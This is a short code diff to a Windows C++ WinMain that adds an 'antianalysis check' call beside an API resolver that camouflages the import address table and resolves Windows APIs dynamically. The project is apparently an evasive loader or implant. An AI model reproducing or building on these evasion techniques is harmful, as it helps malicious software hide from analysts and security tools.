@@ -30,8 +30,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	Tools		 tools;
 	DWORD		 process = 0; 
 
+
 	API::APIResolver &resolver = API::APIResolver::GetInstance(); // Get instance of the API resolver
 
+
+	hide.IsBeingWatched(resolver); // Initial antianalysis check
+	
 	resolver.IATCamo();		// Camouflage the import address table
 	resolver.LoadModules(); // Get handles to necessary dlls
 	resolver.ResolveAPI();  // Resolve Win/Nt api functions 
